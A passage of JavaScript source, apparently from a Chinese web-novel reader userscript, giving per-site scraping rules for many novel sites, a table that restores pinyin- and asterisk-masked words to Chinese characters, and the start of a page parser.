            url: "http://www\\.du00\\.com/read/\\d+/\\d+/[\\d_]+\\.html",
            titleReg: "(.*?)(?:第\\d+段)?,(.*) - 读零零小说网",
            titlePos: 1,
            prevSelector: "#footlink a:first",
            indexSelector: "#footlink a:contains('目录')",
            nextSelector: "#footlink a:last",
            // 内容
            contentSelector: "#pagecontent, .divimage",
            useiframe: true,
            mutationSelector: "#pagecontent",
            mutationChildCount: 2,
            contentRemove: "font",
            contentReplace: [
                "读零零小说网欢迎您的光临.*",
                "，好看的小说:|本书最新免费章节请访问。",
                "\\*文學馆\\*"
            ],
            fixImage: true,
            checkSection: true
        },
        {siteName: "奇书屋",
            url: "http://www.qishuwu.com/\\w+/\\d+/",
            titleReg: "(.*)_(.*)_.*_奇书屋",
        },
        {siteName: "17k小说网",
            url: /^http:\/\/\S+\.17k\.com\/chapter\/\S+\/\d+\.html$/,
            titleReg: /(.*?)-(.*?)-.*/,
            contentSelector: "#chapterContent",
            contentRemove: "#authorSpenk, .like_box, #hotRecommend, .ct0416, .recent_read, div[style]"
        },
        {siteName: "看下文学",
            url: "^http://www\\.kanxia\\.net/k/\\d*/\\d+/\\d+\\.html$",
            titleReg: /(.*?)-(.*)TXT下载_看下文学/,
            contentReplace: /看下文学/g
        },
        {siteName: "青帝文学网",
            url: /^http:\/\/www\.qingdi\.com\/files\/article\/html\/\d+\/\d+\/\d+\.html$/,
            titleReg: /(.*?)最新章节_(.*?)_青帝文学网_.*/
        },
        {siteName: "侠客中文网",
            url: /^http:\/\/www\.xkzw\.org\/\w+\/\d+\.html/,
            contentSelector: ".readmain_inner .cont",
            contentPatch: function(fakeStub){
                fakeStub.find('title').html(fakeStub.find('.readmain_inner h2').text());
            }
        },
        {siteName: "ChinaUnix.net",
            url: /^http:\/\/bbs\.chinaunix\.net\/thread-.*\.html/,
            contentSelector: ".t_f:first"
        },
        {siteName: "123du 小说",
            url: /^http:\/\/www\.123du\.(?:net|cc)\//,
            titleReg: "(.*)-(.*) 百家乐",
            titlePos: 1,
            contentSelector: "#content, #contents",
            contentReplace: "一秒记住.www.*|小说最新更新，来123读书www.123du.net",
            contentRemove: "a",
            contentPatch: function(fakeStub){
                var content = fakeStub.find("#DivContentBG").html().match(/第\d*页([\s\S]*)一秒记住/)[1];
                $('<div id="content"/>').html(content).appendTo(fakeStub.find('body'));
            }
        },
        {siteName: "动力中文",
            url: "^http://dlzw\\.cc/article.*\\.html",
            nextSelector: "span:contains('下一篇') > a",
            prevSelector: "span:contains('上一篇') > a",
            indexSelector: "#pt a[href^='http']"
        },
        {siteName: "塔读文学",
            url: "^http://www\\.tadu\\.com/book/\\d+/\\d+/",
            titleReg: /(.*?),(.*?),/,
            contentSelector: "#partContent",
            contentPatch: function(fakeStub){
                var m = fakeStub.find("body").html().match(/\.html\(unescape\("(.*)"\)/);
                if(m){
                    var unescapeContent = m[1];
                    fakeStub.find("#partContent").html(unescape(unescapeContent));
                }
            }
        },
        {siteName: "第一中文",
            url: "^http://www\\.dyzww\\.com/cn/\\d+/\\d+/\\d+\\.html$" ,
            contentReplace: {
                '<img.*?ait="(.*?)".*?>': "$1",
                'www\\.dyzww\\.com.*|♂|шШщ.*': ""
            }
        },
        {siteName: "16K小说网",
            url: "^http://www\\.16kbook\\.org/Html/Book/\\d+/\\d+/\\d+\\.shtml$",
            titleReg: '(\\S+) (.*)- 16K小说网',
            useiframe: true,
            contentRemove: '.bdlikebutton',
            contentReplace: {
                '(<center>)?<?img src..(http://www.16kbook.org)?(/tu/\\S+\\.jpg).(>| alt."\\d+_\\d+_\\d*\\.jpg" />)(</center>)?': "$3",
                "/tu/shijie.jpg":"世界", "/tu/xiangdao.jpg":"想到", "/tu/danshi.jpg":"但是", "/tu/huilai.jpg":"回来", "/tu/yijing.jpg":"已经", "/tu/zhende.jpg":"真的", "/tu/liliang.jpg":"力量", "/tu/le.jpg":"了", "/tu/da.jpg":"大", "/tu/shengli.jpg":"胜利", "/tu/xiwang.jpg":"希望", "/tu/wandan.jpg":"完蛋", "/tu/de.jpg":"的",
                "16kbook\\s*(首发更新|小说网)": "",
            }
        },
        {siteName: "来书屋",
            url: "http://www.laishuwu.com/html/\\d+/\\d+/\\d+.html",
            titleSelector: ".chaptertitle h2",
            bookNameSelector: ".chaptertitle h1",
            contentReplace: "txt\\d+/",
        },
        {siteName: "万书吧",
            url: "http://www\\.wanshuba\\.com/Html/\\d+/\\d+/\\d+\\.html",
            titleReg: "(.*?)/(.*?)-万书吧",
            indexSelector: "#mulu",
            prevSelector: "#previewpage",
            nextSelector: "#papgbutton a:contains('手机下一章')",
            contentReplace: "\\[www.*?\\]"
        },
        {siteName: "大文学",
            url: "^http://www\\.dawenxue\\.net/html/\\d+/\\d+/\\d+\\.html",
            titleReg: "(.*?)-(.*)-大文学",
            contentSelector: "#clickeye_content",
            contentReplace: "\\(?大文学\\s*www\\.dawenxue\\.net\\)?|\\(\\)",
        },
        {siteName: "奇热",
            url: "^http://www\\.qirexs\\.com/read-\\d+-chapter-\\d+\\.html",
            titleReg: "(.*?)-(.*?)-",
            titlePos: 1,
            contentSelector: "div.page-content .note",
            contentRemove: "a",
            contentReplace: "”奇热小说小说“更新最快|首发,/.奇热小说网阅读网!|奇热小说网提供.*|\\(手机用户请直接访问.*"
        },
        {siteName: "热点",
            url: "^http://www\\.hotsk\\.com/Html/Book/\\d+/\\d+/\\d+\\.shtml",
            titleReg: "(.*?) 正文 (.*?)- 热点书库 -",
            contentReplace: "\\(热点书库首发:www.hotsk.com\\)|无弹窗小说网|www.zhuZhuDao.com .猪猪岛小说.|小说章节更新最快"
        },
        {siteName: "落秋中文",
            url: "^http://www\\.luoqiu\\.(com|net)/html/\\d+/\\d+/\\d+\\.html",
            titleReg: "(.*?)-(.*?)-",
            contentReplace: "&lt;/p&gt;"
        },
        {siteName: "全本小说网",
            url: "^http://www\\.qb5\\.com/xiaoshuo/\\d+/\\d+/\\d+\\.html",
            titleReg: "(.*)_(.*)_",
            contentRemove: "div[class]",
            contentReplace: "全.{0,2}本.{0,2}小.{0,2}说.{0,2}网.{0,2}|[ｗWw ]+.{1,10}[CｃcǒOｍMМ ]+",
        },
        {siteName: "手牵手小说网",
            url: "^http://www\\.sqsxs\\.com/\\d+/\\d+/\\d+\\.html",
            titleReg: "(.*?)最新章节_\\S* (.*)_手牵手小说网",
            contentReplace: "访问下载txt小说.百度搜.|免费电子书下载|\\(百度搜\\)|『文學吧x吧.』|¤本站网址：¤"
        },
        {siteName: "六月中文网",
            url: "^http://www\\.6yzw\\.org/.*\\.html",
            contentReplace: [
                "百度搜索 本书名.*",
                "更新最快|看最新章节",
                "穿越小说吧 sj131"
            ]
        },
        {siteName: "飞卢小说网",
            url: "^http://b\\.faloo\\.com/p/\\d+/\\d+\\.html",
            titleSelector: "#title h1",
            nextSelector: "a#next_page",
            prevSelector: "a#pre_page",
            indexSelector: "a#huimulu",
            contentSelector: "#main > .main0",
            contentRemove: "> *:not(#con_imginfo, #content)",
            contentReplace: "飞卢小说网 b.faloo.com 欢迎广大书友光临阅读，最新、最快、最火的连载作品尽在飞卢小说网！",
            contentPatch: function(fakeStub){
                fakeStub.find("#content").find(".p_gonggao").remove()
                // fakeStub.find("#con_imginfo").prependTo("#content");
            }
        },
        {siteName: "顶点小说",
            url: "^http://www\\.(?:23us|xs222)\\.com/html/\\d+/\\d+/\\d+\\.html$",
            titleReg: "(.*?)-\\S*\\s(.*?)-顶点小说",
            titlePos: 0,
            indexSelector: "#footlink a:contains('返回目录')",
            prevSelector: "#footlink a:contains('上一页')",
            nextSelector: "#footlink a:contains('下一页')",
            contentSelector: "#contents",
            contentReplace: " \\(看小说到顶点小说网.*\\)|【记住本站只需一秒钟.*】",
            contentPatch: function(fakeStub){
                var temp=fakeStub.find('title').text();
                var realtitle = temp.replace(/第.*卷\s/,'');
                fakeStub.find('title').html(realtitle);
            }
        },
        {siteName: '笔下阁',
            url: "^http://www\\.bixiage\\.com/\\w+/\\d+/\\d+/\\d+\\.html",
            titleReg: "(.*)最新章节免费在线阅读_(.*)_笔下阁",
            indexSelector: ".read_tools a:contains('返回目录')",
            prevSelector: ".read_tools a:contains('上一页')",
            nextSelector: ".read_tools a:contains('下一页')",
            contentReplace: [
                "看更新最快的.*www.bixiage.com",
                "笔下阁为您提供全文字小说.*",
                "如果你觉得笔下阁不错.*",
                "本篇是小说.*章节内容，如果你发现内容错误.*"
            ]
        },
        // 内容需要js运行。
        {siteName: "读读看",
            url: "^http://www\\.dudukan\\.net/html/.*\\.html$",
            contentReplace: "看小说“就爱读书”|binhuo|www\\.92to\\.com",
            useiframe: true,
            mutationSelector: "#main",
            mutationChildCount: 0,
        },
        {siteName: "151看书网",
            url: "^http://www\\.151kan\\.com/kan/.*\\.html",
            contentSelector: "#msg",
            useiframe: true,
            mutationSelector: "#msg",
            contentReplace: [
                /[\/|]?www\.151(?:看|kan)\.com[\/|]?/ig,
                /151看书网(?:纯文字)?/ig,
            ]
        },
        {siteName: "就爱读书",
            url: "^http://www\\.92to\\.com/\\w+/\\w+/\\d+\\.html$",
            titleReg: "(.*?)-(.*?)-",
            useiframe: true,
            timeout: 500,
            contentReplace: "看小说.就爱.*"
        },
        {siteName: "书书网",
            url: "http://www\\.shushuw\\.cn/shu/\\d+/\\d+\\.html",
            titleReg: "(.*) (.*?) 书书网",
            titlePos: 1,
            useiframe: true,
            timeout: 500,
            contentReplace: "！~！[\\s\\S]*"
        },
        {siteName: "找小说网",
            url: "http://www\\.zhaoxiaoshuo\\.com/chapter-\\d+-\\d+-\\w+/",
            titleReg: "(.*) - (.*) - 找小说网",
            titlePos: 1,
            useiframe: true,
            timeout: 500,
            contentRemove: "div[style]"
        },
        {siteName: "ABC小说网",
            url: "^http://www\\.bookabc\\.net/.*\\.html",
            useiframe: true
        },
        // 内容js，地址特殊生成。
        {siteName: "哈哈文学",
            url: /^http:\/\/www\.hahawx\.com\/.*htm/,
            titleReg: /(.*?)-(.*?)-.*/,
            contentSelector: "#chapter_content",
            contentReplace: /(?:好书推荐|书友在看|其他书友正在看|好看的小说|推荐阅读)：。|(?:www|ｗｗｗ|ｂｏｏｋ).*(?:com|net|org|ｃｏｍ|ｎｅｔ)|全文字阅读|无弹窗广告小说网|哈哈文学\(www.hahawx.com\)|souDU.org|Ｓｏｕｄｕ．ｏｒｇ|jīng彩推荐：/ig,
            contentPatch: function(fakeStub){
                var content = fakeStub.find("#chapter_content");
                var m = content.find("script").text().match(/output\((\d+), "(\d+\.txt)"\);/);
                if(m && m.length == 3){
                    var aid = m[1],
                        files = m[2];
                    var subDir = "/" + (Math.floor(aid / 1000) + 1);
                    var subDir2 = "/" + (aid - Math.floor(aid / 1000) * 1000);
                    var url = "http:\/\/r.xsjob.net\/novel" + subDir + subDir2 + "/" + files;
                    content.attr({
                        class: "reader-ajax",
                        src: url,
                        charset: "gbk"
                    });
                }
            }
        },
        {siteName: "3Z中文网",
            url: "^http://www\\.zzzcn\\.com\\/(3z\\d+/\\d+\\/|modules\\/article\\/App\\.php\\?aid=\\d+&cid=\\d+){1}$",
            // titleReg: "(.*?)-(.*)TXT下载",
            contentSelector: "#content3zcn",
            indexSelector: "a:contains('返回目录')",
            prevSelector: "a:contains('上 一 页')",
            nextSelector: "a:contains('下 一 页'), a:contains('返回书架')",
            contentReplace: [
                /[{(][a-z\/.]+(?:首发文字|更新超快)[})]/ig,
                "手机小说站点（wap.zzzcn.com）",
                "一秒记住.*为您提供精彩小说阅读。", 
            ],
            contentPatch: function(fakeStub){
                fakeStub.find("a:contains('返回书架')").html("下 一 页").attr("href", fakeStub.find("a:contains('返回目录')").attr("href"));
                fakeStub.find("#content3zcn").find(".titlePos, font.tips, a").remove();
            }
        },
        // 特殊处理。
        {siteName: "手打吧",
            url: /^http:\/\/shouda8\.com\/\w+\/\d+\.html/,
            contentReplace: /[w\s\[\/\\\(]*.shouda8.com.*|(\/\/)?[全文字]?首发|手打吧|www.shou.*|\(w\/w\/w.shouda8.c\/o\/m 手、打。吧更新超快\)|小说 阅读网 www.xiaoshuoyd .com/ig,
            contentPatch: function(fakeStub){
                var scriptSrc = fakeStub.find('body').html().match(/outputContent\('(.*txt)'\)/)[1];
                scriptSrc = "http://shouda8.com/ajax.php?f=http://shouda8.com/read" + scriptSrc;
                fakeStub.find('#content').attr({
                    "class": 'reader-ajax',
                    src: scriptSrc
                });
            }
        },
        {siteName: "好看小說網",
            url: "http://tw\\.xiaoshuokan\\.com/haokan/\\d+/\\d+\\.html",
            contentSelector: ".bookcontent",
            prevSelector: "a.redbutt:contains('上一頁')",
            indexSelector: "a.redbutt:contains('返回章節目錄')",
            nextSelector: "a.redbutt:contains('下一頁')",
            contentReplace: "[a-z;&]*w.[xｘ]iaoshuokan.com 好看小說網[a-z;&族】）]*"
        },
        {siteName: "E品中文网",
            url: "http://www\\.epzww\\.com/book/\\d+/\\d+",
            titleReg: "(.*?),(.*?),",
            contentSelector: "#showcontent",
        },
        {siteName: "飘天文学",
            url: "http://www\\.piaotian\\.net/html/\\d+/\\d+/\\d+\\.html",
            titleReg: "(.*)最新章节,(.*),飘天文学",
            contentSelector: "#content",
            useiframe: true,
            contentRemove: "table",
            contentReplace: /[{〖]请在百度搜索.*[}〗]|.(?:百度搜索飄天|无弹窗小说网).*\.Net.|\[飄天.*无弹窗小说网\]/ig,
            contentPatch: function(fakeStub) {
                fakeStub.find("#content h1").appendTo(fakeStub.find('body'));
            }
        },

        {siteName: "天使小说网",
            url: "http://www\\.tsxs\\.cc/files/article/html/\\d+/\\d+/\\d+\\.html",
            contentSelector: "#content"
        },
        {siteName: "紫雨阁小说网",
            url: "http://www\\.ziyuge\\.com/\\w+/\\w+/\\d+/\\d+/\\d+\\.html",
            titleReg: "(.*?)-正文-(.*?)-紫雨阁小说网",
            contentSelector: ".reader_content",
            nextSelector: "#divNext a",
            prevSelector: "#divPrev a",
            contentReplace: "\\(.*www.ziyuge.com.*\\)"
        },
        {siteName: "破风中文网",
            url: "http://www\\.pofeng\\.net/xiaoshuo/\\d+/\\d+\\.html",
            useiframe: true
        },
        {siteName: "读客吧",
            url: "http://dukeba\\.com/book/\\d+/\\d+/\\d+\\.shtml",
            useiframe: true,
            contentSelector: "#content > div[style]",
            contentRemove: "a, div[align]:has(font)",
        },
        {siteName: "一起阅",
            url: "http://www\\.17yue\\.com/\\w+/\\d+/\\d+\\.html",
            useiframe: true,
        },
        {siteName: "诺秋网",
            url: "http://www\\.nuoqiu\\.com/static/\\d+/\\d+\\.html",
            titleReg: "(.*) (.*) 诺秋网",
            titlePos: 1,
            contentReplace: "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓[\\s\\S]+诺秋网文字更新最快……】@！！"
        },
        {siteName: "言情后花园",
            url: "http://www\\.yqhhy\\.cc/\\d+/\\d+/\\d+\\.html",
            titleReg: "(.*)-(.*)-.*-言情后花园",
            titlePos: 1,
            contentSelector: "#content",
            contentRemove: "a, span[style], script",
            contentReplace: "请记住本站： www.yqhhy.cc|更多，尽在言情后花园。"
        },
        {siteName: "六九中文",
            url: "http://www.69zw.com/\\w+/\\d+/\\d+/\\d+.html",
            titleSelector: ".chapter_title",
            bookNameSelector: ".readhead h1",
            contentSelector: ".yd_text2",
            // titleReg: "(.*)?_(.*)-六九中文",
            contentReplace: "[\\*]+本章节来源六九中文.*请到六九中文阅读最新章节[\\*]+|－\\\\[wＷ]+.*书友上传/－"
        },
        {siteName: "免费小说阅读网",
            titleReg: "(.*) , (.*) , 免费小说阅读网",
            titlePos: 1,
            url: "^http://book\\.yayacms\\.com/\\w+/book_\\d+_\\d+.html",
            contentRemove: "a, div[style]",
            contentReplace: "http://book.YaYaCMS.com/.*|ｂｏｏｋ．ｙａｙａｃｍｓ．ｃｏｍ",
        },
        {siteName: "书农在线书库",
            url: "http://www\\.shunong\\.com/yuedu/\\d+/\\d+/\\d+.html",
            contentSelector: ".bookcontent",
        },
        {siteName: "努努书坊",
            url: "http://book\\.kanunu\\.org/.*/\\d+/\\d+\\.html",
            contentSelector: "table:eq(4) p",
        },
        {siteName: "五月中文网",
            url: "^http://5ycn\\.com/\\d+/\\d+/\\d+\\.html",
            contentRemove: "div[align='center'], a",
        },
        {siteName: "笔下中文",
            url: "^http://www\\.bxzw\\.org/\\w+/\\d+/\\d+/\\d+\\.shtml",
            contentRemove: "div[align='center'], center, #footlink1",
            contentReplace: "www\\.bxzw\\.org|//无弹窗更新快//|\\(看精品小说请上.*\\)|\\(看.*最新更新章节.*\\)"
        },
        {siteName: "着笔中文网",
            url: "^http://.*zbzw\\.com/\\w+/\\d+\\.html",
            contentReplace: "精彩小说尽在.*"
        },
        {siteName: "D586小说网",
            url: 'http://www\\.d586\\.com/',
            contentRemove: 'a',
            contentReplace: [
                '【www.13800100.com文字首发D5８6小说网】',
                '【☆D5８6小说网☆//文字首发】.*'
            ]
        },
        {siteName: "豌豆文学网",
            url: "^http://www.wandoou.com/book/\\d+/\\d+\\.html",
            titleReg: "(.*?)最新章节-(.*?)-",
            contentReplace: [
                /[{（]<a href.*[}）]|网欢迎广大书友光临阅读，.*/ig,
                /[レ★]+.*(?:请支持)?豌(?:.|&amp;)?豆.?文.?学.*[レ★]+/ig,
                /[（(【]豌.?豆.?文.?学.*[）)】]/ig,
                /∷更新快∷∷纯文字∷|http:永久网址，请牢记！/ig,
                /[/\\{]*豌.?豆.?文.?学.?网.*(?:高速更新|\/|\\|})/ig,
            ]
        },
        {siteName: "都来读小说网",
            url: /^http:\/\/www\.doulaidu\.com\/[^\/]+\/\d+\/\d+\.html/,
            useiframe: true,
            contentReplace: [
                /www．.+．(?:com|net)/ig,
                /都来读小说网首发|www\.[a-z0-9]+\.(?:org|com)/ig,
            ]
        },
        {siteName: "小说TXT",
            url: /^http:\/\/www\.xshuotxt\.com\//,
            contentReplace: "\\(.*无弹窗全文阅读\\)",
            contentPatch: function(fakeStub) {
                fakeStub.find('#title a').remove();
            }
        },
        // {siteName: "567中文",
        //     url: "http://www.xntk.net/book_j.php",
        //     titleReg: "(.*),(.*)- 567中文",
        //     contentSelector: "#booktext"
        // },
        {siteName: "看书啦",
            url: "^http://www.kanshu.la/book/\\w+/\\d+\\.shtml",
            titleReg: "(.*)-(.*)-看书啦",
            titlePos: 1,
            nextUrl: function($doc){
                var html = $doc.find('script:contains(next_page = ")').html();
                var m = html.match(/next_page = "(.*?)";/);
                if (m) return m[1];
            },
            prevUrl: function($doc){
                var html = $doc.find('script:contains(preview_page = ")').html();
                var m = html.match(/preview_page = "(.*?)";/);
                if (m) return m[1];
            }
        },
        
        // {siteName: "雅文言情小说吧",  // 一章分段
        //     url: "http://www\\.yawen8\\.com/\\w+/\\d+/\\d+\\.html",
        //     contentSelector: "#content .txtc"
        // }
    ];

    // ================== 小说拼音字、屏蔽字修复 ==================
    var replacements = {
        // ===格式整理===
        // "\\(|\\[|\\{|（|【|｛":"（",
        // "\\)|\\]|\\}|）|】|｝":"）",
        ",": "，",
        "\\*|＊":"*",
        "[wWｗＷ]{3}":"www",
        "w{3}(\u3001|\u3002)":"www.",
        "[cCｃＣ][oOｏＯ][mMｍＭ]":"com",
        "[nNｎＮ][eｅEＥ][tｔTＴ]":"net",
        "[cCｃＣ][nNｎＮ]":"cn",
        "(\\.|\u3001|\u3002)com":".com",
        "(\\.|\u3001|\u3002)net":".net",
        "(\\.|\u3001|\u3002)cn":".cn",
        "[pPｐＰ][sSｓＳ][:：]":"ps:",
        "。{5,7}":"……","~{2,50}":"——","…{3,40}": "……","－{3,20}":"——",
        "。(,|，|。)": "。",
        "？(,|，)": "？",
        "”(,|，|。)": "”",
        "@{3,}": "",

        "\\[+CP.*(http://file.*\\.jpg)\\]+": "<img src='$1'>",
        "\\[搜索最新更新尽在[a-z\\.]+\\]": "",
        "<a>手机用户请到m.qidian.com阅读。</a>": "",

        // === 星号屏蔽字还原 ===
        "十有(\\*{2})":"十有八九", "\\*(2)不离十":"八九不离十",
        "G(\\*{2})":"GSM", "感(\\*{2})彩":"感情色彩",
        "强(\\*{2})u5B9D":"强大法宝",

        // === 双字替换 ===
        "暧me[iì]":"暧昧",
        "b[ěe]i(\\s|&nbsp;)*j[īi]ng":"北京","半shen": "半身", "b[ìi]j[ìi]ng":"毕竟",
        "ch[oō]ngd[oò]ng":"冲动", "缠mian": "缠绵", "成shu": "成熟", "赤lu[oǒ]": "赤裸", "春guang": "春光",
        "dang校": "党校", "da子": "鞑子", "diao丝": "屌丝", "d[úu](?:\\s|<br/>)*l[ìi]": "独立", "dú *cái":"独裁", "d?[iì]f[āa]ng":"地方", "d[ìi]\\s*d[ūu]":"帝都", "di国":"帝国", "du\\s{0,2}c[áa]i":"独裁",
        "f[ǎa]ngf[óo]":"仿佛", "fei踢": "飞踢", "feng流": "风流", "风liu": "风流", "f[èe]nn[ùu]":"愤怒",
        "gao潮": "高潮", "干chai": "干柴", "gu[oò]ch[ée]ng":"过程", "gu[āa]nx[iì]":"关系", "g[ǎa]nji[àa]o":"感觉", "国wu院":"国务院",
        "han住": "含住", "hai洛因": "海洛因", "红fen": "红粉", "火yao": "火药", "h[ǎa]oxi[àa]ng":"好像", "hu[áa]ngs[èe]":"黄色", "皇d[ìi]":"皇帝", "昏昏yu睡":"昏昏欲睡",
        "j[ìi]nháng":"进行", "jinv": "妓女", "jirou": "鸡肉", "ji者":"记者", "ju花":"菊花","j[īi]动":"激动", "jili[èe]":"激烈", "肌r[òo]u":"肌肉","ji射":"激射", "ji[ēe]ch[uù]":"接触", "j[ùu]li[èe]": "剧烈", "jǐng惕": "警惕",
        "k[ěe]n[ée]ng": "可能", "开bao": "开苞",  "k[àa]o近": "靠近",
        "ling辱": "凌辱", "luan蛋": "卵蛋", "脸sè": "脸色", "lu出":"露出",
        "m[ǎa]ny[ìi]":"满意", "m[ǎa]sh[àa]ng":"马上", "m[ée]iy[oǒ]u":"没有", "mei国": "美国", "m[íi]ngb[áa]i":"明白", "迷huan": "迷幻", "mi茫":"迷茫", "m[íi]n\\s{0,2}zh[ǔu]": "民主", "迷jian": "迷奸", "mimi糊糊":"迷迷糊糊", "末(?:\\s|<br/?>)*ì":"末日",
        "n[àa]me":"那么", "n[ée]ngg[oò]u":"能够", "nán\\s{0,2}hǎi": "那会",
        "pi[áa]o客":"嫖客", "p[áa]ngbi[āa]n":"旁边",
        "q[íi]gu[àa]i":"奇怪", "qin兽":"禽兽", "q[iī]ngch[uǔ]":"清楚",
        "r[úu]gu[oǒ]":"如果", "r[oó]ngy[ìi]":"容易", "ru白色": "乳白色", "rén员":"人员", "rén形":"人形",
        "sh[iì]ji[eè]":"世界", "sh[ií]ji[aā]n":"时间", "sh[ií]h[oò]u": "时候", "sh[ií]me":"什么", "shi身": "失身", "sh[ūu]j[ìi]":"书记", "shu女": "熟女", "上chuang": "上床", "呻y[íi]n": "呻吟", "sh[ēe]ngzh[íi]": "生殖", "深gu": "深谷", "双xiu": "双修", "生r[ìi]": "生日", "si盐":"私盐",
        "t[uū]r[áa]n":"突然", "tiaojiao": "调教", "推dao": "推倒", "脱guang": "脱光", "t[èe]bi[ée]":"特别", "t[ōo]nggu[òo]":"通过", "tian来tian去":"舔来舔去",
        "w[ēe]ixi[ée]":"威胁", "wèizh[ìi]":"位置", "wei员":"委员",
        "xiu长": "修长", "亵du": "亵渎", "xing福": "幸福", "小bo":"小波", "xiong([^a-z])":"胸$1",
        "y[iī]y[àa]ng":"一样", "y[īi]di[ǎa]n":"一点", "y[ǐi]j[īi]ng":"已经", "疑huo":"疑惑", "阳w[ěe]i": "阳痿", "yao头": "摇头", "yaotou": "摇头", "摇tou": "摇头", "yezhan": "野战", "you饵": "诱饵", "you惑": "诱惑", "you导": "诱导", "引you": "引诱", "you人": "诱人","旖ni":"旖旎", "yu念":"欲念", "you敌深入":"诱敌深入",
        "z[iì]j[iǐ]": "自己","z[ìi](?:\\s|<br/?>)*y[oó]u": "自由","zh[iī]d?[àa]u?o":"知道","zha药": "炸药", "zhan有": "占有", "政f[ǔu]": "政府", "zh[èe]ng\\s{0,2}f[uǔ]": "政府", "zong理":"总理", "zh[ōo]ngy[āa]ng": "中央", "中yang":"中央", "zu[oǒ]y[oò]u":"左右", "zh[oō]uw[ée]i":"周围", "中nan海":"中南海", "中j委":"中纪委", "中zu部":"中组部", "政zhi局":"政治局", "(昨|一|时|余)(?:<br/?>|&nbsp;|\\s)*ì":"$1日",

        // === 单字替换 ===
        "b[āà]ng":"棒","bào":"爆","b[àa]":"吧","bī":"逼","bō":"波",
        "cāo": "操", "cǎo": "草", "cào": "操", "chāng": "娼", "chang": "娼", "cháo": "潮", "chā": "插", "chéng": "成", "chōu": "抽", "chuáng": "床", "chún": "唇", "ch[ūu]n": "春", "cuō": "搓", "cū": "粗",
        "dǎng": "党", "dàng": "荡", "dāo": "刀", "dòng": "洞", "diao": "屌",
        "fǎ": "法", "féi": "肥", "fù": "妇", 
        "gu[āa]n": "官",
        "hán": "含", "hóu": "喉", "hòu": "厚", "huā": "花", "huá": "华", "huò": "惑", "hùn": "混", "hún": "魂",
        "jiǔ": "九", "j[īi]ng": "精", "jìn": "禁", "jǐng": "警", "jiāng": "江", "jiān": "奸", "jiāo": "交", "jūn": "军", "jū": "拘", "jú": "局", "jī": "激", "激ān":"奸",
        "kù": "裤", "k[àa]n": "看",
        "[1l]àng": "浪", "liáo": "撩", "liú":"流", "lì":"莉", "liè":"烈", "[1l]uàn":"乱", "lún":"伦", "luǒ":"裸", "lòu":"露", "[l1]ù":"露", "lǜ":"绿",
        "mǎi": "买", "mài": "卖", "máo": "毛", "mā": "妈", "méng": "蒙", "mén": "门", "miè": "灭", "mí": "迷", "mì": "蜜", "m[ōo]": "摸",
        "nǎi": "奶", "nèn": "嫩", "niào": "尿", "niē": "捏", "nòng": "弄", "nǚ": "女",
        "pào": "炮", "piàn": "片",
        "qiāng": "枪", "qíng": "情", "qīn": "亲", "qiú": "求", "quán": "全",
        "rén":"人", "rì": "日", "([^a-z])ri":"$1日", "</p>\\n<p>\\s*ì":"日", "rǔ": "乳",
        "sāo":"骚", "sǎo": "骚", "sè": "色", "([^a-z])se": "$1色", "shā": "杀", "shēn":"呻", "shén":"神", "shè": "射", "shǐ": "屎", "shì": "侍", "sǐ": "死", "sī": "私", "shǔn": "吮", "sǔn": "吮", "sū": "酥",
        "tān":"贪", "tiǎn": "舔", "t[ǐi]ng":"挺", "tǐ": "体", "tǒng": "捅", "tōu": "偷", "tou": "偷", "tuǐ": "腿", "tūn": "吞", "tún": "臀", "wēn": "温", "wěn": "吻",
        "xiǎo":"小", "x[ìi]ng": "性", "xiōng": "胸", "xī": "吸", "xí": "习", "xué": "穴", "xuè": "穴", "xùe": "穴",  "xuan":"宣",
        "yāng":"央", "yàn":"艳", "y[īi]n":"阴", "yào": "药", "yé": "爷", "yòu": "诱", "zàng": "脏", "([^a-z])y[uù]": "$1欲", "yín": "淫",
        "zhēn":"针", "zēn":"针", "zhà":"炸", "zhèng":"政", "zǒu": "走", "zuì":"罪", "zuò":"做", "zhong":"中",

        // ===误替换还原===
        "碧欲": "碧玉","美欲": "美玉","欲石": "玉石","惜欲": "惜玉","宝欲": "宝玉",
        "品性": "品行","德性": "德行",
        "波ok":"book", "波SS": "BOSS",

        // ===其他修正===
        "n吧":"nba",
        "弥俩": "你俩",
        "妳": "你",
        "圞|垩|卝|龘":"",

        // ===去广告===
        "全文字无广告": "",
        "uutxt\\.org": "",
        "3vbook\\.cn": "",
        "txt53712/": "",
        "\xa0{4,12}":"\xa0\xa0\xa0\xa0\xa0\xa0\xa0"
    };
    var replacements_reg = {};

    // 转换函数
    function contentReplacements(text){
        if(!config.content_replacements) return text;

        var s = new Date().getTime();

        // 转换
        for (var key in replacements) {
            if(!replacements_reg[key]){
                replacements_reg[key] = new RegExp(key, "ig");
            }

            text = text.replace(replacements_reg[key], replacements[key]);
        }

        debug("小说屏蔽字修复耗时：" + (new Date().getTime() - s) + 'ms');
        return text;
    }

    // ====================== Parser ==============================
    function Parser(info, doc, curPageUrl){
        this.info = info || {};
        this.doc = doc;
        this.$doc = $(doc);
        this.curPageUrl = curPageUrl || doc.URL;

        this.isTheEnd = false;
        this.isSection = false;

        // 当前页的 host，后面检验用到
        var tmpLink = document.createElement('a');
        tmpLink.href = this.curPageUrl;
        this.curPageHost = tmpLink.host;
    }
    Parser.prototype = {
        getAll: function(callback){
            this.patch();

            this.getTitles();
            this.getPrevUrl();
            this.getIndexUrl();
            this.getNextUrl();
            this.getContent(callback);

            return this;
        },
        patch: function(){
            var contentPatch = this.info.contentPatch;
            if(contentPatch){
                try {
                    contentPatch(this.$doc);
                    debug("Apply Content Patch Success.");
                } catch (e) {
                    debug("Error: Content Patch Error!", e);
                }
            }
        },
        getTitles: function(){
            var docTitle = this.$doc.find("title").text();

            if (this.info.titleReg){
                var matches = docTitle.match(new RegExp(this.info.titleReg));
                if(matches && matches.length == 3){
                    var titlePos = ( this.info.titlePos || 0 ) + 1,
                        chapterPos = (titlePos == 1) ? 2 : 1;
                    this.bookTitle = matches[titlePos].trim();
                    this.chapterTitle = matches[chapterPos].trim();
                }

                debug("  TitleReg:", this.info.titleReg, matches);
            } else if (this.info.titleSelector){
                this.chapterTitle = this.$doc.find(this.info.titleSelector).text();
            }

            if(this.info.bookNameSelector){
                this.bookTitle = this.$doc.find(this.info.bookNameSelector).text();
            }


            if(!this.chapterTitle){
                this.chapterTitle = this.autoGetChapterTitle(this.doc);
            }

            // 标题间增加一个空格
            this.chapterTitle = this.chapterTitle
                    .replace(rule.titleReplace, "")
                    .trim()
                    .replace(/(第?\S+?[章节卷回])(.*)/, "$1 $2");

            this.docTitle = this.bookTitle ?
